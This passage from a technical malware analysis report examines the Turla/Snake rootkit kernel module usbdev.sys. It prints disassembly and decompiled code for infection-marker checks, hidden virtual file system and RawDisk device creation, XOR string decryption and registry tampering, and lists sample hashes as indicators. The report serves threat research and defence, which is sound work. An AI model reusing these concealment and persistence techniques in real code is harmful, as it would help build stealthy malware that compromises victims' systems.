@@ -1,0 +1,457 @@
+Analysis - Payload Sample B - usbdev.sys (Resource: 101)
+A very extensive analysis of a similar kernel module of Sample B (usbdev.sys) has been documented in ‘Uroburos:
+the snake rootkit’ [2] by deresz and tecamac.
+Sample B also checks for the presence of infection markers in form of events:
+19 of 34 12/31/2014 09:19 AM
+CIRCL » TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/
+.text:00023210         push  ebp
+.text:00023211         mov   ebp, esp
+.text:00023213         sub   esp, 130h
+.text:00023219         mov   [ebp+string.Length], 70h
+.text:0002321F         mov   [ebp+string.MaximumLength], 72h
+.text:00023225         mov   [ebp+string.Buffer], offset aBasenamedobjec ; "\BaseNamedObjects\{B93DFED5-9A3B-459b"...
+.text:0002322C         lea   eax, [ebp+var_110]
+.text:00023232         mov   [ebp+SecurityDescriptor], eax
+.text:00023235         mov   [ebp+ObjectAttributes.Length], 18h
+.text:0002323F         mov   [ebp+ObjectAttributes.RootDirectory], 0
+.text:00023249         mov   [ebp+ObjectAttributes.Attributes], 40h
+.text:00023253         lea   ecx, [ebp+string]
+.text:00023256         mov   [ebp+ObjectAttributes.ObjectName], ecx
+.text:0002325C         mov   [ebp+ObjectAttributes.SecurityDescriptor], 0
+.text:00023266         mov   [ebp+ObjectAttributes.SecurityQualityOfService], 0
+.text:00023270         lea   edx, [ebp+ObjectAttributes]
+.text:00023276         push  edx       ; ObjectAttributes
+.text:00023277         push  1F0003h     ; DesiredAccess
+.text:0002327C         lea   eax, [ebp+EventHandle]
+.text:00023282         push  eax       ; EventHandle
+.text:00023283         call  ZwOpenEvent
+or as pseudo-code:
+1 string .Length = 0x70;
+2 string .MaximumLength = 0x72;
+3 string .Buffer = L"\BaseNamedObjects\{B93DFED5-9A3B-459b-A617-59FD9FAD693E}";
+4 SecurityDescriptor = &v4
+5 ObjectAttributes.Length = 24;
+6 ObjectAttributes.RootDirectory = 0;
+7 ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
+8 ObjectAttributes.ObjectName = & string ;
+9 ObjectAttributes.SecurityDescriptor = 0;
+10 ObjectAttributes.SecurityQualityOfService = 0;
+11 if ( ZwOpenEvent(&EventHandle, 0x1F0003u, &ObjectAttributes) )
+12 {
+13 ...
+That means, the famous Agent.btz marker
+\BaseNamedObjects{B93DFED5-9A3B-459b-A617-59FD9FAD693E}
+is checked directly using a UNICODE_STRING structure without using RtlInitUnicodeString(). A brief comparison
+with other samples, like
+Type of Hash Hash
+MD5 57770d70b704811e8ac13893337cea32
+SHA1 0e6dff1007b6a5f744b2bc90978496328c95ed11
+SHA-256 65fdaf08e562611ce58f1d427f198f8743d88a68e1c4d92afe6dc6251e8a3112
+or
+Type of Hash Hash
+MD5 06a3f5df6ac23db15ba52581a38c725b
+SHA1 a6cc9d9034637192d264cb4e9b6b83b70cc36da9
+SHA-256 43e71b993d6e7c977caaf2ed7610a71758734d87ec2ceb20a84e573ea05a01b3
+shows, that this marker is checked in the same way.
+The analysis of this kernel module by deresz and tecamac is very detailed. We advise the interested reader to work
+through their document to understand all the details.
+Implemented transports
+In this module, the following transport or communication modules are present:
+Type 1: tcp
+Type 2: np, m2b
+-> TODO: Compare this with the observed transports in
+20 of 34 12/31/2014 09:19 AM
+CIRCL » TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/
+userland modules
+modules described in other reports
+Disassembler Library
+This sample contains a large chunk of code taken from the Udis86 Disassembler Library for x86 / x86-64 project [6]
+RawDisk1, RawDisk2 and fixdata.dat
+The devices
+\Device\RawDisk1
+\Device\RawDisk2
+and the file
+\SystemRoot\$NtUninstallQ722833$\fixdata.dat
+are already known from other reports.
+If the file fixdata.dat could successfully be created within the function
+1NTSTATUS create_fixdata_dat()
+2{
+3 char v1;
+4 NTSTATUS error;
+5 OBJECT_ATTRIBUTES ObjectAttributes;
+6 LARGE_INTEGER AllocationSize;
+7 UNICODE_STRING Name;
+8 UINT_PTR ViewSize;
+9 __int64 FileInformation;
+10 struct _IO_STATUS_BLOCK IoStatusBlock;
+11
+12 Name.Length = 0x58;
+13 Name.MaximumLength = 0x5A;
+14 Name.Buffer = L"\SystemRoot\$NtUninstallQ722833$\fixdata.dat";
+15 ObjectAttributes.Length = 24;
+16 ObjectAttributes.RootDirectory = 0;
+17 ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
+18 ObjectAttributes.ObjectName = &Name
+19 ObjectAttributes.SecurityDescriptor = 0;
+20 ObjectAttributes.SecurityQualityOfService = 0;
+21 AllocationSize = 0x6400000i64;
+22 error = call_IoCreateFile(
+23 &FileHandle,
+24 FILE_ADD_FILE|FILE_LIST_DIRECTORY,
+25 &ObjectAttributes,
+26 &IoStatusBlock,
+27 &AllocationSize,
+28 FILE_ATTRIBUTE_NORMAL,
+29 0,
+30 FILE_OPEN_IF,
+31 FILE_RANDOM_ACCESS|FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT|FILE_NO_INTERMEDIATE_BUFFERING,
+32 0,
+33 0);
+34 if ( !error )
+35 {
+36 dword_5BDEC = FileHandle;
+37 if ( IoStatusBlock.Information == 2 )
+38 {
+39 FileInformation = AllocationSize.QuadPart;
+40 error = ZwSetInformationFile(FileHandle, &IoStatusBlock, &FileInformation, 8u, FileEndOfFileInformation);
+41 if ( error )
+42 goto LABEL_10;
+43 v1 = 1;
+44 }
+45 else
+46 {
+47 v1 = 0;
+48 }
+49 ObjectAttributes.Length = 24;
+50 ObjectAttributes.RootDirectory = 0;
+51 ObjectAttributes.Attributes = 0;
+52 ObjectAttributes.ObjectName = 0;
+21 of 34 12/31/2014 09:19 AM
+CIRCL » TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/
+53 ObjectAttributes.SecurityDescriptor = 0;
+54 ObjectAttributes.SecurityQualityOfService = 0;
+55 error = ZwCreateSection(&gSectionHandle, 6u, &ObjectAttributes, 0, 4u, 0x18000000u, FileHandle);
+56 if ( !error )
+57 {
+58 ViewSize = 0;
+59 error = ZwMapViewOfSection(gSectionHandle, 0xFFFFFFFF, &BaseAddress_0, 0, 0, 0, &ViewSize, ViewUnmap, 0, 4u);
+60 if ( !error )
+61 {
+62 gViewSize = ViewSize;
+63 dword_4FBD4[0] = 0;
+64 if ( v1 )
+65 sub_2F6E0(0, gViewSize, 2, gViewSize >> 15, 32, 0x200u);
+66 }
+67 }
+68 }
+69 LABEL_10:
+70 if ( error )
+71 {
+72 if ( BaseAddress_0 )
+73 {
+74 ZwUnmapViewOfSection(0xFFFFFFFF, BaseAddress_0);
+75 BaseAddress_0 = 0;
+76 }
+77 if ( gSectionHandle )
+78 {
+79 ZwClose_1(gSectionHandle);
+80 gSectionHandle = 0;
+81 }
+82 ZwClose_1(FileHandle);
+83 FileHandle = 0;
+84 }
+85 return error;
+86}
+also the devices are created within this function:
+1NTSTATUS create_file_rawdisk()
+2{
+3 NTSTATUS ERROR;
+4 OBJECT_ATTRIBUTES ObjectAttributes;
+5 LSA_UNICODE_STRING DestinationString;
+6 UINT_PTR ViewSize;
+7
+8 if ( disks_initialized )
+9 {
+10 ERROR = 0;
+11 }
+12 else if ( DriverObject )
+13 {
+14  sub_2DFD0(&Lock);
+15  KeInitializeEvent(&Event, SynchronizationEvent, 0);
+16  sub_2DFB0(&ListHead);
+17  ERROR = sub_2F490();
+18 if ( !ERROR )
+19  {
+20 RtlInitUnicodeString(&DestinationString, L"\Device\RawDisk1");
+21   ERROR = IoCreateDevice(
+22        DriverObject,
+23 0,
+24        &DestinationString,
+25        FILE_DEVICE_DISK,
+26        FILE_REMOVABLE_MEDIA,
+27 0,
+28        &DeviceObject_RawDisk1);
+29 if ( !ERROR )
+30 {
+31    ERROR = call_SeSetSecurityDescriptorInfo(DeviceObject_RawDisk1);
+32 if ( !ERROR )
+33    {
+34     DeviceObject_RawDisk1->Flags = (DeviceObject_RawDisk1->Flags | 0x10);
+35     DeviceObject_RawDisk1->Flags = DeviceObject_RawDisk1->Flags & 0xFFFFFF7F;
+36     ObjectAttributes.Length = 24;
+37     ObjectAttributes.RootDirectory = 0;
+38     ObjectAttributes.Attributes = 0;
+39     ObjectAttributes.ObjectName = 0;
+40 ObjectAttributes.SecurityDescriptor = 0;
+41     ObjectAttributes.SecurityQualityOfService = 0;
+22 of 34 12/31/2014 09:19 AM
+CIRCL » TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/
+42     MaximumSize = 0x1000000i64;
+43     ERROR = ZwCreateSection(&SectionHandle, 6u, &ObjectAttributes, &MaximumSize, 4u, 0x18000000u, 0);
+44 if ( !ERROR )
+45     {
+46      ViewSize = MaximumSize.LowPart;
+47      ERROR = ZwMapViewOfSection(SectionHandle, 0xFFFFFFFF, &BaseAddress, 0, 0, 0, &ViewSize, ViewUnmap, 0, 4u);
+48 if ( !ERROR )
+49      {
+50 MaximumSize = ViewSize;
+51       RtlInitUnicodeString(&DestinationString, L"\Device\RawDisk2");
+52       ERROR = IoCreateDevice(
+53            DriverObject,
+54 0,
+55            &DestinationString,
+56            FILE_DEVICE_DISK,
+57            FILE_REMOVABLE_MEDIA,
+58 0,
+59            &DeviceObject_RawDisk2);
+60 if ( !ERROR )
+61       {
+62        ERROR = call_SeSetSecurityDescriptorInfo(DeviceObject_RawDisk2);
+63 if ( !ERROR )
+64        {
+65         DeviceObject_RawDisk2->Flags = (DeviceObject_RawDisk2->Flags | 0x10);
+66         DeviceObject_RawDisk2->Flags = DeviceObject_RawDisk2->Flags & 0xFFFFFF7F;
+67         sub_2F6E0(1, MaximumSize.LowPart, 2, MaximumSize.LowPart >> 15, 32, 0x200u);
+68         byte_4FBBD = 0;
+69         ERROR = create_system_threads(&handle, sub_2EFB0, 0, 0);
+70 disks_initialized = 1;
+71        }
+72       }
+73      }
+74     }
+75    }
+76   }
+77  }
+78 if ( ERROR )
+79  {
+80 if ( DeviceObject_RawDisk1 )
+81   {
+82    IoDeleteDevice(DeviceObject_RawDisk1);
+83    DeviceObject_RawDisk1 = 0;
+84   }
+85 if ( DeviceObject_RawDisk2 )
+86   {
+87    IoDeleteDevice(DeviceObject_RawDisk2);
+88    DeviceObject_RawDisk2 = 0;
+89   }
+90 if ( BaseAddress )
+91   {
+92    ZwUnmapViewOfSection(0xFFFFFFFF, BaseAddress);
+93    BaseAddress = 0;
+94   }
+95 if ( SectionHandle )
+96   {
+97    ZwClose_1(SectionHandle);
+98    SectionHandle = 0;
+99   }
+100 }
+101 }
+102 else
+103 {
+104  ERROR = 0xC0000001;
+105 }
+106 return ERROR;
+107}
+Decryption of string for VFS drive
+The authors demonstrate that they have a sense of humor. In the following example, they decrypt (XOR) the strings
+used to assemble the locations of where to drop the other components of the malware to. The final destinations are:
+.\IdeDrive1\cryptoapi.dll
+.\IdeDrive1\inetpub.dll
+But have a closer look at how they decrypt the string:
+23 of 34 12/31/2014 09:19 AM
+CIRCL » TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/
+[...]
+.text:0001E122         mov   [ebp+xor_key], 4E415341h ; key
+.text:0001E129         mov   [ebp+part_1], 7253605h  ; part 1 encrypted
+.text:0001E130         mov   [ebp+part_2], 3C282524h ; part 2 encrypted
+[...]
+.text:0001E17B         mov   eax, [ebp+part_1]
+.text:0001E17E         xor   eax, [ebp+xor_key]    ; decrypt part 1: IdeD
+.text:0001E181         mov   [ebp+part_1], eax
+[...]
+.text:0001E184         mov   ecx, [ebp+part_2]
+.text:0001E18A         xor   ecx, [ebp+xor_key]    ; decrypt part 2: rive
+.text:0001E18D         mov   [ebp+part_2], ecx
+[...]
+They are seriously using a key 0x4E415341 to decrypt the string. 0x4E415341 is ASCII for ‘NASA’. That’s how they
+decrypt and assemble the string IdeDrive, appending a ‘1’ in the next step and using if for creating the destination.
+Full excerpt below:
+[...]
+.text:0001E11B         mov   [ebp+var_20], 0
+.text:0001E122         mov   [ebp+xor_key], 4E415341h
+.text:0001E129         mov   [ebp+part_1], 7253605h
+.text:0001E130         mov   [ebp+part_2], 3C282524h
+.text:0001E13A         xor   eax, eax
+.text:0001E13C         mov   [ebp+drive], eax
+.text:0001E142         mov   [ebp+var_338], eax
+.text:0001E148         mov   [ebp+var_334], ax
+.text:0001E14F         push  104h      ; size_t
+.text:0001E154         push  0        ; int
+.text:0001E156         lea   ecx, [ebp+cryptoapi.dll]
+.text:0001E15C         push  ecx       ; void *
+.text:0001E15D         call  memset
+.text:0001E162         add   esp, 0Ch
+.text:0001E165         push  104h      ; size_t
+.text:0001E16A         push  0        ; int
+.text:0001E16C         lea   edx, [ebp+inetpub.dll]
+.text:0001E172         push  edx       ; void *
+.text:0001E173         call  memset
+.text:0001E178         add   esp, 0Ch
+.text:0001E17B         mov   eax, [ebp+part_1]
+.text:0001E17E         xor   eax, [ebp+xor_key]
+.text:0001E181         mov   [ebp+part_1], eax
+.text:0001E184         mov   ecx, [ebp+part_2]
+.text:0001E18A         xor   ecx, [ebp+xor_key]
+.text:0001E18D         mov   [ebp+part_2], ecx
+.text:0001E193         mov   edx, [ebp+part_1]
+.text:0001E196         push  edx
+.text:0001E197         call  order_bytes
+.text:0001E19C         mov   [ebp+part_1], eax
+.text:0001E19F         mov   eax, [ebp+part_1]
+.text:0001E1A2         mov   [ebp+part_1], eax
+.text:0001E1A5         mov   ecx, [ebp+part_2]
+.text:0001E1AB         push  ecx
+.text:0001E1AC         call  order_bytes
+.text:0001E1B1         mov   [ebp+part_2], eax
+.text:0001E1B7         mov   edx, [ebp+part_2]
+.text:0001E1BD         mov   [ebp+part_2], edx
+.text:0001E1C3         mov   eax, [ebp+part_1]
+.text:0001E1C6         mov   [ebp+drive], eax
+.text:0001E1CC         mov   ecx, [ebp+part_2]
+.text:0001E1D2         mov   [ebp+var_338], ecx
+.text:0001E1D8         lea   edx, [ebp+drive]
+.text:0001E1DE         add   edx, 0FFFFFFFFh
+.text:0001E1E1         mov   [ebp+var_454], edx
+.text:0001E1E7         mov   eax, [ebp+var_454]
+.text:0001E1ED         mov   cl, [eax+1]
+.text:0001E1F0         mov   [ebp+var_455], cl
+.text:0001E1F6         add   [ebp+var_454], 1
+.text:0001E1FD         cmp   [ebp+var_455], 0
+.text:0001E204         jnz   short loc_1E1E7
+.text:0001E206         mov   edi, [ebp+var_454]
+.text:0001E20C         mov   dx, word ptr ds:a1 ; "1"
+.text:0001E213         mov   [edi], dx
+.text:0001E216         lea   eax, [ebp+drive]
+.text:0001E21C         push  eax
+.text:0001E21D         push  offset a??SCryptoapi_d ; "\??\%s\cryptoapi.dll"
+.text:0001E222         lea   ecx, [ebp+cryptoapi.dll]
+.text:0001E228         push  ecx       ; char *
+24 of 34 12/31/2014 09:19 AM
+CIRCL » TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/
+.text:0001E229         call  sprintf
+.text:0001E22E         add   esp, 0Ch
+.text:0001E231         lea   edx, [ebp+drive]
+.text:0001E237         push  edx
+.text:0001E238         push  offset a??SInetpub_dll ; "\??\%s\inetpub.dll"
+.text:0001E23D         lea   eax, [ebp+inetpub.dll]
+.text:0001E243         push  eax       ; char *
+.text:0001E244         call  sprintf
+[...]
+To describe
+\Registry\Machine\usblink_export
+HKEY_LOCAL_MACHINE\usblink_export
+(also LEGACY_usblink and usblink?)
+Potentially old code
+The malware checks if the queried process has one of the following names
+1 bool __stdcall match_list_of_programs_by_name( char a1)
+2{
+3 return !stricmp(a1, "iexplore.exe")
+4 || !stricmp(a1, "firefox.exe")
+5 || !stricmp(a1, "opera.exe")
+6 || !stricmp(a1, "netscape.exe")
+7 || !stricmp(a1, "mozilla.exe")
+8 || !stricmp(a1, "msimn.exe")
+9 || !stricmp(a1, "outlook.exe")
+10* || !stricmp(a1, "adobeupdater.exe");
+11}
+and if so, it would call pulse_event_wininet_activate() .
+1 char __stdcall check_proces_and_activate_wininet( int a1, int a2, int a3)
+2{
+3[...]
+4 if ( match_list_of_programs_by_name(&program_name) )
+5    pulse_event_wininet_activate();
+6[...]
+7}
+The event \BaseNamedObjects\wininet_activate is then created and pulsed.
+1NTSTATUS pulse_event_wininet_activate()
+2{
+3 NTSTATUS result;
+4 LSA_UNICODE_STRING DestinationString;
+5 OBJECT_ATTRIBUTES ObjectAttributes;
+6 HANDLE EventHandle;
+7 wchar_t SourceString;
+8
+9 swprintf(&SourceString, L"\BaseNamedObjects\%S", "wininet_activate");
+10 RtlInitUnicodeString(&DestinationString, &SourceString);
+11 ObjectAttributes.Length = 24;
+12 ObjectAttributes.RootDirectory = 0;
+13 ObjectAttributes.Attributes = 0;
+14 ObjectAttributes.ObjectName = &DestinationString
+15 ObjectAttributes.SecurityDescriptor = 0;
+16 ObjectAttributes.SecurityQualityOfService = 0;
+17 result = ZwOpenEvent(&EventHandle, 2u, &ObjectAttributes);
+18 if ( !result )
+19 {
+20 result = ZwPulseEvent(EventHandle, 0);
+21 ZwClose_1(EventHandle);
+22 }
+23 return result;
+24}
+There are no references to this event, neither in this module nor in the other analyzed modules. Microsoft mentions
+in the documentation of the PulseEvent function [7] ~~:~~
+Note This function is unreliable and should not be used. It exists mainly for backward compatibility. For
+25 of 34 12/31/2014 09:19 AM
+CIRCL » TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/
+more information, see Remarks.
+So it could well be that this part is old code and was forgotten to be removed.
+Applying work-around for bugs related to AMD Athlon and AGP graphics port
+From Microsoft Support article AGP program may hang when using page size extension on Athlon processor [8] the
+following excerpt:
+The following workaround for this issue prevents Memory Manager from using the processor’s Page Size
+Extension feature and may affect the performance of some programs, depending on the paging behavior.
+This registry value also limits non-paged pool to a maximum of 128 megabytes (MB) instead of 256 MB.
+1 int __stdcall disable_processors_page_size_extension_feature( int a1)
+2{
+3 name[0] = 0xA8;
+4 name[1] = 0xAA;
+5 &name[2] = L"\Registry\Machine\System\CurrentControlSet\Control\Session Manager\Memory Management";
+6 ValueName.Length = 32;
+7 ValueName.MaximumLength = 34;
+8 ValueName.Buffer = L"LargePageMinimum";
+9 Data = -1;
+10 v2 = sub_19110();
+11 if ( !v2 )
+12 {
+13 ObjectAttributes.Length = 24;
+14 ObjectAttributes.RootDirectory = 0;
+15 ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
+16 ObjectAttributes.ObjectName = name;
+17 ObjectAttributes.SecurityDescriptor = 0;
+18 ObjectAttributes.SecurityQualityOfService = 0;
+19 if ( !ZwOpenKey(&KeyHandle, 2u, &ObjectAttributes) )
+20* {
+21 ZwSetValueKey(KeyHandle, &ValueName, 0, 4u, &Data, 4u);
+22 ZwClose_1(KeyHandle);
+23 }
+24}
+25
